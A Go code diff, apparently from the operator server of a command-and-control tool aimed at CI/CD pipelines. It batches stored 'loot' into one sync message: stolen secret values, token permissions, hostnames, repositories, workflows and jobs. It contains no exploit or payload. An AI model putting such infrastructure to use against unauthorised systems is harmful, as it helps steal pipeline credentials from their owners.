@@ -49,6 +49,9 @@ type OperatorMessage struct {
 	// For "analysis_metadata_sync" type
 	AnalysisMetadataSync *AnalysisMetadataSyncPayload `json:"analysis_metadata_sync,omitempty"`
 
+	// For "loot_sync" type
+	LootSync *LootSyncPayload `json:"loot_sync,omitempty"`
+
 	// For "error" type
 	Error string `json:"error,omitempty"`
 }
@@ -100,6 +103,30 @@ type AnalysisMetadataSyncPayload struct {
 	ReposTotal int       `json:"repos_total,omitempty"`
 	Error      string    `json:"error,omitempty"`
 	UpdatedAt  time.Time `json:"updated_at,omitempty"`
+}
+
+type LootSyncPayload struct {
+	Entries []LootSyncEntry `json:"entries"`
+}
+
+type LootSyncEntry struct {
+	SessionID string    `json:"session_id,omitempty"`
+	AgentID   string    `json:"agent_id,omitempty"`
+	Hostname  string    `json:"hostname,omitempty"`
+	Timestamp time.Time `json:"timestamp"`
+	Origin    string    `json:"origin,omitempty"`
+
+	Name      string `json:"name"`
+	Value     string `json:"value"`
+	Type      string `json:"type"`
+	Source    string `json:"source"`
+	HighValue bool   `json:"high_value"`
+
+	Repository string `json:"repository,omitempty"`
+	Workflow   string `json:"workflow,omitempty"`
+	Job        string `json:"job,omitempty"`
+
+	TokenPermissions map[string]string `json:"token_permissions,omitempty"`
 }
 
 // BeaconPayload represents agent beacon data sent to operators.
@@ -208,67 +235,33 @@ func (h *OperatorHub) sendStoredLoot(op *OperatorConn) {
 	}
 
 	slog.Info("sending stored loot to operator", "count", len(lootRows), "session_id", op.sessionID)
-
-	lootByAgent := make(map[string][]*db.LootRow)
+	payload := LootSyncPayload{Entries: make([]LootSyncEntry, 0, len(lootRows))}
 	for _, row := range lootRows {
-		lootByAgent[row.AgentID] = append(lootByAgent[row.AgentID], row)
+		payload.Entries = append(payload.Entries, LootSyncEntry{
+			SessionID:        row.SessionID,
+			AgentID:          row.AgentID,
+			Hostname:         row.Hostname,
+			Timestamp:        row.Timestamp,
+			Origin:           row.Origin,
+			Name:             row.Name,
+			Value:            row.Value,
+			Type:             row.Type,
+			Source:           row.Source,
+			HighValue:        row.HighValue,
+			Repository:       row.Repository,
+			Workflow:         row.Workflow,
+			Job:              row.Job,
+			TokenPermissions: row.TokenPermissions,
+		})
 	}
 
-	for agentID, rows := range lootByAgent {
-		var secrets []ExtractedSecret
-		var tokenPerms map[string]string
-		var hostname, repo, workflow, job string
-		var timestamp time.Time
-
-		for _, row := range rows {
-			secrets = append(secrets, ExtractedSecret{
-				Name:       row.Name,
-				Value:      row.Value,
-				Type:       row.Type,
-				Source:     row.Source,
-				HighValue:  row.HighValue,
-				Repository: row.Repository,
-				Workflow:   row.Workflow,
-				Job:        row.Job,
-			})
-			if len(row.TokenPermissions) > 0 {
-				tokenPerms = row.TokenPermissions
-			}
-			if row.Hostname != "" {
-				hostname = row.Hostname
-			}
-			if row.Repository != "" && repo == "" {
-				repo = row.Repository
-			}
-			if row.Workflow != "" && workflow == "" {
-				workflow = row.Workflow
-			}
-			if row.Job != "" && job == "" {
-				job = row.Job
-			}
-			if row.Timestamp.After(timestamp) {
-				timestamp = row.Timestamp
-			}
-		}
-
-		select {
-		case op.send <- OperatorMessage{
-			Type: "express_data",
-			ExpressData: &ExpressDataPayload{
-				AgentID:          agentID,
-				SessionID:        op.sessionID,
-				Hostname:         hostname,
-				Secrets:          secrets,
-				TokenPermissions: tokenPerms,
-				Timestamp:        timestamp,
-				Repository:       repo,
-				Workflow:         workflow,
-				Job:              job,
-			},
-		}:
-		default:
-			slog.Warn("operator send buffer full during loot sync", "session_id", op.sessionID)
-		}
+	select {
+	case op.send <- OperatorMessage{
+		Type:     "loot_sync",
+		LootSync: &payload,
+	}:
+	default:
+		slog.Warn("operator send buffer full during loot sync", "session_id", op.sessionID)
 	}
 }
 
